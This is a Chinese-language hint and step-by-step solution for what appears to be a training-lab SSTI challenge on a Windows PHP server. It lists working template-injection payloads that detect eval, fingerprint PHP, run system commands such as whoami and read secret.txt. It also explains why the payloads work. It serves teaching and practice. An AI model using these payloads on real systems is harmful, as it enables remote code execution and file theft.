思路提示

SSTI 的核心是模板引擎把 {{ }} 里的内容当成表达式执行。思路分三步：① 先用一个简单的数学表达式（如 {{7*7}}）确认是否被执行；② 确认后尝试执行系统命令或读取环境信息（如 phpversion()、system('whoami')）；③ 找到通关凭证所在位置（通常在当前目录的 secret.txt），用文件读取函数或命令读出。注意本靶场是 Windows 环境，命令和路径要兼容 Windows。

详细解题过程（点击展开）
解题步骤：
1. 探测：提交 {{7*7}}，输出 49 说明表达式被执行。
2. 指纹：{{phpversion()}}、{{php_uname()}}。
3. 执行：{{system('whoami')}}（Windows 环境没有 id 命令，用 whoami 才有回显）。
4. 定位通关凭证：{{getcwd()}} 查看工作目录。
5. 读取：{{system('type secret.txt')}}
原理：{{ }} 中非已知变量的内容会被拼成 eval('return ' . $expr . ';')，因此任意 PHP 表达式都会以 Web 服务进程权限执行。
也可不用 shell：{{file_get_contents('secret.txt')}}
